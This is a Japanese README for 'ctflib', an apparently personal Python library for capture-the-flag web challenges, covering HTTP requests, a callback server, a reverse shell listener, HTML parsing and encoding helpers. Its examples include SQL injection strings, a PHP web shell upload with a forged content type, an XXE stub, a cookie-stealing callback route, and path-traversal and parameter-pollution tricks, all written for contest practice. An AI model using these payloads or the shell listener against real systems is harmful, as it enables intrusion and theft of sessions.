# ctflib

CTF の Web 問題用ライブラリ。HTTP 通信には [HTTPX](https://www.python-httpx.org/) を使用する。
`pip install -e .` で必要な依存もインストールされる。

```
ctf-lib/
├── ctflib/          # ライブラリ本体
│   ├── client.py    # HTTP リクエスト送信
│   ├── flag.py      # フラグ取得
│   ├── server.py    # 簡易 Web サーバ
│   ├── shell.py     # Reverse Shell 受付
│   ├── dom.py       # HTML パース（DOM / CSS セレクタ / フォーム）
│   ├── b64.py       # Base64
│   └── urlcodec.py  # URL エンコード / クエリ文字列
├── pyproject.toml
└── tests/           # python3 -m unittest discover -s tests
```

## インストール

どの作業ディレクトリからでも `import ctflib` できるようにする（editable なのでソースを直せば即反映）:

```sh
pip install -e /Users/sota70/workspace/ctf-lib --user --break-system-packages
```

この環境の Python は PEP 668 の externally-managed なので `--user --break-system-packages` が要る
（`~/.local` にだけ入るのでシステムには触らない）。venv 内なら `pip install -e .` だけでよい。
戻す時は `pip uninstall ctflib`。

ソースを直接使う場合も `pip install "httpx>=0.28,<0.29"` が必要。
**そのディレクトリで実行するか** `sys.path` を通す:

```python
import sys; sys.path.insert(0, "/Users/sota70/workspace/ctf-lib")
from ctflib import *
```

以降のサンプルは `from ctflib import ...` で書く（`from ctflib import *` でも同じものが入る）。

---

## 1. HTTP リクエスト送信

```python
from ctflib import get, post, request, Session

r = post("http://target/login", data={"user": "admin", "pw": "' OR 1--"})
print(r.status, r.text)
```

ペイロード引数は 3 つ。**指定するだけで `Content-Type` が自動で入る**（同時指定は `ValueError`）。

| 引数 | 付与される Content-Type |
|---|---|
| `data=` | `application/x-www-form-urlencoded` |
| `json=` | `application/json` |
| `form=` | `multipart/form-data; boundary=...` |

```python
post(url, data={"a": 1, "b": [1, 2]})        # a=1&b=1&b=2（dict は自動で url エンコード）
post(url, data="id=1' UNION SELECT flag--")  # str / bytes はそのまま送る（無加工）
post(url, json={"role": "admin"})            # {"role": "admin"}
```

`headers=` に自分で `Content-Type` を書いた場合はそちらが優先される。

```python
post(url, data=b"<?xml ... XXE ...>", headers={"Content-Type": "application/xml"})
post(url, data=b"raw", headers={"Content-Type": None})   # Content-Type を一切付けない
```

### form（multipart / ファイルアップロード）

```python
from pathlib import Path

post(url, form={
    "comment": "hello",                                   # 普通のフィールド
    "tags":    ["a", "b"],                                # 同名フィールドを複数回
    "file1":   Path("shell.php"),                         # パス指定
    "file2":   open("payload.bin", "rb"),                 # 開いたファイル
    "file3":   ("shell.php", "<?php system($_GET[0]); ?>"),         # 名前だけ差し替え
    "file4":   ("shell.php", b"\x89PNG...", "image/png"),           # Content-Type 偽装
})
```

- **タプル** = ファイル指定 `(filename, content[, content_type])`
- **リスト** = 同名フィールドの繰り返し
- `content_type` 省略時は拡張子から推測（不明なら `application/octet-stream`）
- ファイル名の `"` や改行はエスケープされる（`filename="a\";x="` 系のインジェクションを自分でやりたい時は生の `data=` を使う）

### proxy / その他の引数

```python
get(url, proxy="127.0.0.1:8080")                      # Burp に流す（スキーム省略可）
get(url, proxy={"https": "http://127.0.0.1:8080"})    # プロトコル別に指定
```

`proxy` を明示した場合は `$no_proxy` を無視するので、`127.0.0.1` 宛でも確実に Burp を通る。
未指定なら環境変数 `$http_proxy` / `$https_proxy` に従う。

その他: `params=`（クエリ文字列に追記）, `headers=`, `cookies=`, `auth=("user","pass")`,
`timeout=`（既定 15 秒）, `allow_redirects=`（既定 True）, `verify=`（既定 **False**＝証明書検証なし）,
`boundary=`（multipart の境界文字列を固定）。

`request("PUT", url, ...)` で任意メソッド。ショートカットは `get/post/put/patch/delete/head/options`。

### レスポンス

```python
r.status / r.status_code / r.ok / r.reason
r.text          # charset を見てデコード
r.content       # bytes（gzip/deflate は解凍済み）
r.json()
r.headers["set-cookie"]     # 大文字小文字を区別しない。同名ヘッダは改行で連結
r.cookies       # このレスポンスがセットした Cookie
r.url           # リダイレクト後の最終 URL
r.elapsed
r.find_flg("sknb{*}")
r.dom()                     # 本文を DOM にパース（結果はキャッシュ。5. 参照）
r.query_selector("input[name=csrf]")
r.query_selector_all("a")
r.forms                     # <form> を Form オブジェクトで
"admin" in r    # 本文の部分一致
```

**4xx/5xx でも例外を投げない**（`r.status` を見る）。

### Session（Cookie を保持）

```python
s = Session(base_url="http://target", proxy="127.0.0.1:8080",
            headers={"X-Forwarded-For": "127.0.0.1"})
s.post("/login", data={"u": "admin", "p": "pass"})   # Set-Cookie を保存
print(s.get("/admin").text)                           # 保存した Cookie で再送
s.cookies                    # {'session': '...'}
s.set_cookie("session", "forged", domain="target")
```

モジュール直下の `get()` / `post()` も共有セッション（`default_session`）を使うので Cookie は引き継がれる。

### asyncio による並列送信

`async def` 内では `session()` と `gather()` で並列送信できる。
`gather` は `from ctflib import *` に含まれる。

```python
from ctflib import *
import asyncio

async def main():
    sess = session()
    sess.get("https://example.com/")
    tasks = [sess.get("https://example.com/hoge") for _ in range(20)]
    resps = await gather(*tasks)
    print([r.status_code for r in resps])

asyncio.run(main())
```

イベントループ内で作った `session()` の `get()` / `post()` などは、通信を予約してハンドルを返す。
実際の送信は `await gather(...)` または `await sess.get(...)` で始まる。
上の例では、`gather` が最初の `/` への通信を完了させ、Cookie を引き継いで 20 件を並列送信する。
具体的には、同じセッションで最初の指定ハンドルより前に予約した通信を、予約順に完了させてから並列送信する。
`gather` の対象より後に予約した通信は、次の `await` / `gather` まで送らない。
その場で単発の結果が必要なら `response = await sess.get(url)` と書く。

結果の並びは引数順で、同じハンドルを再び渡しても再送信しない。
バッチ内で接続プールを共有し、終了時には自動で閉じるため `async with` は不要。
Cookie と履歴は次のバッチにも残る。同じセッションの `gather` 同士は順番に実行する。
失敗時は未完了の通信をキャンセルして例外を送出する。
`await gather(*tasks, return_exceptions=True)` なら、通信の例外を結果リストに格納する。
先行通信に失敗したセッションでは、後続の並列通信を送信しない。
`await` / `gather` に到達しなければ予約だけでは通信しない。

通常の同期コードで作る `session()` は従来どおりその場で送信し `Response` を返す。
イベントループ内で同期通信が必要な場合は `Session()` を明示する。
`ctflib.gather` は予約ハンドル用なので、通常のコルーチンには `asyncio.gather` を使う。

### AsyncSession による明示的な非同期 API

`AsyncSession` は `httpx.AsyncClient` を使い、同じセッション内で接続プールと Cookie を共有する。
`asyncio.gather` に複数のリクエストを渡すと並列に送信できる。

```python
import asyncio
from ctflib import AsyncSession

async def main():
    async with AsyncSession() as client:
        tasks = [client.get("http://127.0.0.1:8000/echo") for _ in range(20)]
        responses = await asyncio.gather(*tasks)
        print([response.status_code for response in responses])

asyncio.run(main())
```

`await client.post(url, json={...})` など、`Session` と同じ送信オプションと `Response` を使える。
`background` は指定せず、`await` で結果を受け取る。
Cookie の操作（`set_cookie` / `clear_cookies`）は同期 API と同じ。
ログインの Cookie が必要なリクエストは、ログインを `await` してから送る。
通信エラーは HTTPX の例外として送出され、タスクのキャンセルは通信にも伝わる。

同じイベントループ内で使い、すべてのリクエストが終了してから `async with` を抜けるか、
`await client.aclose()` で接続を閉じる。プロキシ・TLS 設定ごとに接続プールを再利用する。

### スレッドによるバックグラウンド実行

`request()` と各 HTTP メソッド（`Session` のメソッドも含む）に `background=True` を渡すと、別スレッドで処理し、
`concurrent.futures.Future` をすぐ返す。省略時は従来どおり `Response` を返す。

```python
from ctflib import get, Session

future = get("http://127.0.0.1:8000/status", background=True, timeout=10)
# 待っている間にメインスレッドで別の作業ができる
response = future.result(timeout=15)
print(response.status, response.text)

s = Session(base_url="http://127.0.0.1:8000")
futures = [s.get(path, background=True) for path in ("/status", "/echo")]
responses = [future.result(timeout=15) for future in futures]
```

通信エラーは HTTPX の例外（`httpx.RequestError` など）として発生し、
バックグラウンド実行では `result()` で再送出される。`result(timeout=...)` は結果を待つ時間で、
期限を過ぎても通信は停止しない。`cancel()` は処理開始前だけ有効。
スレッドは非 daemon なので、Python 終了時も実行中の処理の完了を待つ。

同じ `Session` の通信も並列に進む。Cookie の参照・更新と履歴への追加はロックで保護される。
モジュール直下の関数が共有する `default_session` も同様。
実行順序は保証されず、`history` はレスポンスの記録順になる。
ログインなど前のレスポンスの Cookie が必要な通信は、先にその `result()` を待つこと。
並列レスポンスが同じ Cookie を更新した場合は、後に更新された値が残る。
完了まではセッション設定・引数の辞書・`jar`・`history` を直接変更せず、
アップロード用のファイルも閉じたり読み進めたりしないこと。

---

## 2. フラグ取得

```python
from ctflib import find_flg, find_flgs

find_flg("Here is your flag: sknb{flag}", "sknb{*}")   # -> 'sknb{flag}'
```

ワイルドカード:

| 記法 | 意味 |
|---|---|
| `*` | 任意の文字列（既定は最短一致） |
| `?` | 任意の 1 文字 |
| `\*` `\?` | リテラルの `*` `?` |

`*` 以外の文字は正規表現としてエスケープされるので `flag[1]{*}` のような書式もそのまま書ける。

```python
find_flg(text, "sknb{*}", greedy=True)    # 最長一致
find_flg(text, "sknb{*}", dotall=True)    # 改行をまたぐ
find_flg(text, "sknb{*}", default="")     # 見つからない時の戻り値（既定 None）
find_flgs(text, "sknb{*}")                # 全件（重複除去・出現順）

find_flg(response, "sknb{*}")             # Response / bytes / リストもそのまま渡せる

set_flag_format("sknb{*}")                # 既定書式を設定（環境変数 CTF_FLAG_FORMAT も可）
find_flg(text)                            # 以降 fmt 省略可
```

コマンドラインからも: `curl -s http://target | python3 -m ctflib flag 'sknb{*}'`

---

## 3. 簡易 Web サーバ

XSS / SSRF / OOB のコールバック受けに。express と同じ `(req, res)`。

```python
from ctflib import route, listen

@route("/hook")               # annotation でエンドポイントとコントローラを紐づける
def hook(req, res):
    print("stolen cookie:", req.query.get("c"))
    res.json({"ok": True})

listen(8000)                  # Ctrl-C まで待ち受け（リクエストは自動でログ表示）
```

エンドポイントを省略すると**関数名**から決まる。

```python
@route                        # -> /hook
def hook(req, res): res.text("ok")

@route                        # index / root は -> /
def index(req, res): res.html("<h1>hi</h1>")

@route                        # __ は / に展開 -> /admin/panel
def admin__panel(req, res): res.text("nested")
```

annotation は関数をそのまま返すので重ねられる。メソッド限定・パスパラメータも同様。

```python
@route("/one")                # 1 つのコントローラを複数のエンドポイントに
@route("/two")
def both(req, res): res.text("both")

@app.post("/login")           # POST のみ
def login(req, res): res.json(req.form)

@route("/user/:id")           # パスパラメータ -> req.params["id"]
def user(req, res): res.text(req.params["id"])

@route("/files/*")            # ワイルドカード -> req.params["*"]
def files(req, res): res.text(req.params["*"])

@app.default                  # どのルートにも一致しなかった時（404 の代わり）
def catch_all(req, res): res.text("ok")
```

lambda など名前のない関数を使う場合はエンドポイントを明示する（従来の第二引数形式も使える）。

```python
route("/user/:id", lambda req, res: res.text(req.params["id"]))
route("/x", ctrl, methods=["GET", "POST"])
```

**req**: `.method` `.path` `.url` `.query` `.query_all` `.headers`（小文字キー）`.body` `.text`
`.form` `.json()` `.cookies` `.params` `.ip` `.time`
（サーバ側の `req.form` は**受信した urlencoded ボディ**のパース結果。クライアントの `form=`（multipart 送信）とは別物）

**res**（メソッドチェーン可）: `.status(code)` `.set(k, v)` `.type(ct)` `.cookie(k, v, **opts)`
`.send(body)` `.json(obj)` `.html(s)` `.text(s)` `.redirect(url)` `.end()`

複数サーバを立てたり、スクリプトを止めずに使う場合:

```python
from ctflib import App
app = App(log=True)
app.listen(8000, background=True)     # 別スレッドで起動
hit = app.wait_hit(timeout=60)        # 新しいリクエストが来るまで待つ
print(hit.query, hit.headers, hit.text)
app.hits                              # 受信した全リクエスト
app.close()
```

起動時に LAN IP を表示するので、そのままペイロードに埋め込める。
`python3 -m ctflib serve 8000` で全リクエストをログするだけのサーバが立つ。

---

## 4. Reverse Shell 受付

```python
from ctflib import reverse_shell

reverse_shell(4444)     # 待ち受け → 接続が来たら対話シェル
```

接続後は入力した文字列がそのままコマンドとして送られ、出力が表示される。
`exit` / `quit` / Ctrl-D で終了（終了時も最後の出力を約 1 秒回収してから閉じる）。

```python
ok = reverse_shell(4444,
                   host="127.0.0.1",   # 待ち受けアドレス（既定 0.0.0.0）
                   timeout=60,         # 60 秒来なければ諦めて False を返す
                   upgrade=True,       # 接続直後に PTY 昇格の一行を送る
                   grace=1.0,          # 終了時に出力を回収する秒数
                   quiet=False)
```

戻り値はシェルが繋がったかどうかの bool。PTY 昇格用の定型文は `UPGRADE_PAYLOADS` に入っている。
`python3 -m ctflib shell 4444` でも同じ。

---

## 5. HTML パース（DOM）

レスポンスから CSRF トークン・隠しフィールド・コメントを抜くのに毎回正規表現を書かなくていいように。
壊れた HTML（閉じ忘れの `<p>` `<li>` `<tr>`、大文字タグ、引用符なし属性）でも**例外を投げない**。

```python
from ctflib import parse_html, get

doc = parse_html(get("http://target/login"))   # str / bytes / Response をそのまま渡せる
print(doc.title, doc.links, doc.comments)      # フラグはだいたいコメントに落ちている
r = get("http://target/login"); doc = r.dom()  # Response からも（結果はキャッシュ）
```

**Document**: `.title` `.html` `.head` `.body` `.links` `.images` `.scripts` `.comments`
`.forms` `.form(名前かindex)` `.text`（`<script>` `<style>` は除外）

**Element**: `.tag` `.attrs` `.id` `.class_list` `.text` `.inner_html` `.outer_html`
`.parent` `.children` `.next_element_sibling` `.matches(sel)` `.closest(sel)`
`el["href"]`（無い属性は `None`）`"href" in el` `len(el)` `for child in el`

| メソッド | 意味 |
|---|---|
| `doc.find(sel)` / `query_selector(sel)` | 最初の 1 件（無ければ `None`） |
| `doc.find_all(sel)` / `query_selector_all(sel)` | 全件（文書順） |
| `doc.get_element_by_id(v)` | `#id` と同じ |
| `doc.get_elements_by_tag_name/class_name/name(v)` | ブラウザと同名 |
| `doc.form(0)` / `doc.form("login")` | index か `name`/`id` で `<form>` を 1 つ |

`querySelector` `getElementById` `innerHTML` 系の camelCase 別名もあるので、DevTools からコピペした
式がだいたいそのまま動く。

### CSRF トークン抜き出し → フォーム再送

```python
doc = parse_html(get("http://target/login"))

doc.query_selector('input[name="csrf_token"]')["value"]          # -> 'a1b2'
{i["name"]: i["value"] for i in doc.find_all("input[type=hidden]")}

form = doc.form()                                     # doc.form("login") / doc.form(1) でも
form.fields                                           # -> {'csrf_token': 'a1b2', 'username': '', ...}
payload = form.fill(username="admin", password="' OR 1--")
post(form.url("http://target/login"), data=payload)   # form.method は 'POST'
```

**Form**: `.action` `.method`（大文字化、既定 `GET`）`.enctype` `.name` `.id` `.inputs`
`.fields` / `.data`（hidden 込み・未チェックの checkbox は落ちる・`<select>` は選択中の値）
`.fill(**kw)`（`fields` に上書きした dict を返す。元は壊さない）`.url(base)`（`action` を絶対 URL に）

### セレクタ

```python
doc.find_all('a.admin, a[href^="/adm"]')              # セレクタリスト、^= $= *= ~= |=
doc.find_all("table#users > tr:not(:first-child)")     # ヘッダ行を飛ばす
doc.find("li:has(> a):last-child")
doc.find_all('td:contains("admin")')                  # 非標準。CTF では便利なので入れてある

for row in doc.find_all("table#users > tr:not(:first-child)"):
    print([cell.text.strip() for cell in row.find_all("td")])
```

`:nth-child(an+b)` `odd` `even` `:nth-of-type` `:only-child` `:empty` `:root` `[attr=v i]` に対応。
未対応の擬似クラスや壊れたセレクタは、位置を添えた `ValueError` になる（黙って 0 件にはしない）。

---

## 6. Base64

貼り付けた文字列がだいたい何でも通る方の base64。padding が無くても、`-_` でも、改行やゴミが
混ざっていても**例外を投げずに**デコードする（Node の `Buffer.from` と同じ気持ち）。

```python
from ctflib import b64e, b64d, b64decode_str

b64e("admin")                     # -> 'YWRtaW4='   （str/bytes/Response を受ける）
b64d("YWRtaW4")                   # -> b'admin'     padding 無しでよい
b64decode_str("aGk_-\n!!")        # -> 'hi?'        url-safe・混在・改行・ゴミ入り
```

| 関数 | 用途 |
|---|---|
| `b64encode(data, urlsafe=, padding=, wrap=)` | `b64e`。`urlsafe=True` で `-_`、`padding=False` で `=` 無し、`wrap=76` で MIME 折り返し |
| `b64decode(data, text=, strict=)` | `b64d`。既定は寛容、`text=True` で `str` を返す |
| `b64decode_str(data)` | `text=True` 固定。必ず `str` |
| `b64url_encode` / `b64url_decode` | JWT・Cookie 用の url-safe・padding 無し |
| `atob` / `btoa` | ブラウザ・Node と同じ latin-1 セマンティクス |
| `is_b64(s)` / `b64_len(n)` | base64 っぽいかの判定 / n バイトのエンコード後の長さ |
| `b64decode_all(text)` | 文字列中の base64 っぽい塊を全部デコード（可読な結果だけ返す） |

```python
b64e(b"\xff\xef\xbe", urlsafe=True, padding=False)   # -> '_---'
b64e(get("http://target/dump"))                      # Response は .content を直接エンコード
b64url_encode('{"admin":true}')                      # -> 'eyJhZG1pbiI6dHJ1ZX0'  （JWT ペイロード）
b64decode_all(page_html)                             # -> [b'sknb{b64_is_fun}', ...]
btoa("caf\xe9"); atob("YWRtaW4")                     # -> 'Y2Fm6Q==' / 'admin'
b64d("not base64 at all", strict=True)               # ValueError（厳密に判定したい時だけ）
```

デコードは `=` で打ち切る（Node と同じ）。`"YWRtaW4=X"` は `b'admin'` になり、末尾のゴミは読まない。

コマンドラインからも: `curl -s http://target | python3 -m ctflib b64 -d`（`-e` でエンコード）

---

## 7. URL エンコード

JS のセマンティクスをそのまま。ブラウザのコンソールからコピペしたペイロードが動くように、
`encodeURIComponent` 綴りの別名も用意してある。16 進は JS と同じ**大文字**。

```python
from ctflib import encode_uri_component, encode_uri, decode_uri_component

encode_uri_component("a b&c=d/e")     # -> 'a%20b%26c%3Dd%2Fe'   全部エスケープ
encode_uri("http://x/a b?q=1&r=2")    # -> 'http://x/a%20b?q=1&r=2'
```

**`encodeURIComponent` と `encodeURI` の違い**: 予約文字 `; / ? : @ & = + $ , #` を残すかどうか。
URL 全体を包むなら `encode_uri`、**クエリの値 1 個**を包むなら `encode_uri_component`。

| 入力 | `encode_uri_component` | `encode_uri` |
|---|---|---|
| `"a b"` | `a%20b` | `a%20b` |
| `"a&b"` | `a%26b` | `a&b` |
| `"/a/b"` | `%2Fa%2Fb` | `/a/b` |

デコードも対称で、`decode_uri` は予約文字になるエスケープ（`%2F` など）を**解かずに残す**。

```python
decode_uri("/a%20b%2Fc")                    # -> '/a b%2Fc'
decode_uri_component("/a%20b%2Fc")          # -> '/a b/c'
decode_uri_component("100%")                # -> '100%'   壊れたエスケープはそのまま
decode_uri_component("100%", strict=True)   # ValueError
```

### クエリ文字列

```python
from ctflib import urlencode, parse_qs, parse_qsl, urldecode, qs_stringify, qs_parse

urlencode({"a": 1, "b": ["x", "y z"]})   # -> 'a=1&b=x&b=y+z'   （client の data= と同じ形式）
urlencode({"q": "1 2"}, plus=False)      # -> 'q=1%202'
parse_qs("?a=1&a=2&b=")                  # -> {'a': ['1', '2'], 'b': ['']}   先頭の ? は無視
parse_qsl("b=2&a=1")                     # -> [('b', '2'), ('a', '1')]       順序を保つ
urldecode("a=1&a=2")                     # -> {'a': '2'}                     後勝ちの平坦な dict
qs_stringify({"a": "1 2", "c": None, "d": True})   # -> 'a=1%202&c=&d=true'  Node 互換
qs_parse("a=1&b=2&b=3&c")                          # -> {'a': '1', 'b': ['2', '3'], 'c': ''}
```

### フィルタ回避・URL 組み立て

```python
from ctflib import double_encode, url_decode_all, add_params, url_join, url_parse

double_encode("../")                     # -> '..%252F'      二重エンコードの定番
url_decode_all("%25252e%25252e%25252f")  # -> '../'          変化しなくなるまで解く
add_params("/x?a=1#frag", {"b": "2 3"})  # -> '/x?a=1&b=2+3#frag'   既存パラメータは残す
add_params("/x?id=1", {"id": "2"})       # -> '/x?id=1&id=2'       パラメータ汚染用
url_join("http://x/a/b", "../c?d=1")     # -> 'http://x/c?d=1'
url_parse("http://x:8080/p?a=1").port    # -> 8080
```

コマンドラインからも: `python3 -m ctflib url -e "' OR 1--"` / `-d` でデコード。

---

## 制限事項

- ユーザー指定のリクエストヘッダ名は小文字に正規化される。
- `verify` は既定で False（自己署名証明書や Burp の MITM 用）。
- HTTP/2、Brotli、チャンク送信のリクエストには非対応。
- DOM: フィールドは `<form>` の**中にあるかどうか**でしか紐づかない（`form="id"` 属性は見ない）。
  複数選択の `<select multiple>` は先頭の 1 件しか `fields` に出ない。`:has()` の中の結合子は
  文書全体に対して評価される（`li:has(> a)` のような先頭の `>` `+` `~` は正しく効く）。
- Base64: `b64decode_all` は**可読な結果だけ**返すので、gzip などバイナリになる塊は出てこない。
  `strict=True` は padding 無しの url-safe（JWT の各セグメント）を弾く ── 既定の寛容な方を使う。
- URL: `url_decode_all` が解くのはパーセントエンコードだけ（`+` や HTML エンティティは対象外）。
  単独サロゲートは JS のように例外にせず WTF-8 のバイト列としてエスケープする。
